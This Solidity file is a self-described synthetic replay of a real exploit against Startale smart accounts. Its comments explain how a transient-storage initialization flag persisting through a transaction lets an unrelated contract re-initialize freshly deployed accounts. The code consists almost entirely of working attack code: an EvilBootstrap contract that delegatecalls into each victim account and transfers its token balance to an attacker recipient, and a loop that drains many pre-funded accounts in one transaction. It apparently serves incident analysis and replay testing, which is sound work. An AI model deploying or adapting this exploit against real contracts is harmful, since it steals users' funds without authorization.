// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

// Synthetic standalone exploit for the 2026-09-Startale playground replay.
//
// Faithfully reproduces the on-chain attack (see
// evm-hack-registry/2026-09-Startale_exp/test/Startale_exp.sol and
// Startale_exp.md for the full write-up).
//
// Root cause: StartaleSmartAccount.initializeAccount() gates non-self callers
// ONLY with Initializable.requireInitializable() == tload(INIT_SLOT). The
// AccountProxy constructor sets that transient flag with tstore(INIT_SLOT, 1).
// Because EIP-1153 transient storage is scoped to the whole TRANSACTION (not the
// constructor CREATE frame), the flag stays set on a freshly deployed account for
// the rest of the tx. So, in the SAME tx that the factory deploys and legitimately
// initializes a counterfactual (pre-funded) account, an unrelated contract can
// call initializeAccount() a SECOND time with a malicious bootstrap, which runs
// via DELEGATECALL in the account's own context and sweeps its tokens. No
// signature, no ownership, zero attacker capital.
//
// The replay engine has no cheatcodes, so instead of Foundry's `deal()` to each
// victim's counterfactual address, the exploit is seeded (via a setup `dealToken`
// step) with the aggregate pre-funded balance and routes each victim's slice to
// its counterfactual address at runtime — the address is derived on-chain by the
// factory's own computeAccountAddress(), so no off-line address computation is
// needed and the account createAccount() deploys to is exactly where the funds
// were placed. The whole drain runs inside ONE `attack()` call (ONE replay tx),
// which is precisely what keeps the transient flag alive across the per-account
// createAccount()/initializeAccount() pair — the same property the real tx relies
// on (there the loop lives in the attacker contract's constructor).

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IStartaleAccountFactory {
    function createAccount(bytes calldata initData, bytes32 salt) external payable returns (address payable);
    function computeAccountAddress(bytes calldata initData, bytes32 salt)
        external
        view
        returns (address payable);
}

interface IStartaleSmartAccount {
    function initializeAccount(bytes calldata initData) external payable;
    function isInitialized() external view returns (bool);
}

interface IModule {
    function onInstall(bytes calldata data) external;
}

// Stand-in for the bootstrap a normal user supplies at deployment. Executed via
// DELEGATECALL in the account's context by initializeAccount, it registers the
// user's own key in the canonical ECDSAValidator — exactly what makes
// isInitialized() true for a freshly created account.
contract LegitBootstrap {
    function init(address validator, address owner) external {
        IModule(validator).onInstall(abi.encodePacked(owner));
    }
}

// The attacker's malicious bootstrap. Executed via DELEGATECALL in the victim
// account's context on the attacker's second initializeAccount() call, so
// address(this) is the account itself and the transfer moves the account's own
// tokens out.
contract EvilBootstrap {
    function sweep(address token, address to) external {
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal > 0) IERC20(token).transfer(to, bal);
    }
}

contract StartaleSyntheticExploit {
    function attack(
        address factory,
        address ecdsaValidator,
        address token,
        address recipient,
        address[] memory owners,
        bytes32[] memory salts,
        uint256[] memory amounts
    ) external {
        LegitBootstrap legit = new LegitBootstrap();
        EvilBootstrap evil = new EvilBootstrap();

        bytes memory evilInit =
            abi.encode(address(evil), abi.encodeWithSelector(EvilBootstrap.sweep.selector, token, recipient));

        for (uint256 i; i < owners.length; ++i) {
            // The victim's own (public) init data + salt — the only params that
            // reproduce the pre-funded counterfactual address.
            bytes memory legitInit = abi.encode(
                address(legit), abi.encodeWithSelector(LegitBootstrap.init.selector, ecdsaValidator, owners[i])
            );

            // Derive the counterfactual address on-chain and pre-fund it (stands
            // in for the victim transferring to their predicted wallet BEFORE it
            // is deployed).
            address payable predicted =
                IStartaleAccountFactory(factory).computeAccountAddress(legitInit, salts[i]);
            IERC20(token).transfer(predicted, amounts[i]);

            // 1. Deploy the counterfactual account. AccountProxy's constructor
            //    does tstore(INIT_SLOT,1) and runs the victim's legit init
            //    (owner = the victim, not the attacker).
            address payable account = IStartaleAccountFactory(factory).createAccount(legitInit, salts[i]);
            require(IStartaleSmartAccount(account).isInitialized(), "legit init failed");

            // 2. Same tx: the transient flag is still set on `account`, so this
            //    second, unsigned, unauthorized init from an unrelated contract
            //    passes requireInitializable() and delegatecalls the malicious
            //    bootstrap, sweeping the account's token balance to `recipient`.
            IStartaleSmartAccount(account).initializeAccount(evilInit);
        }
    }
}
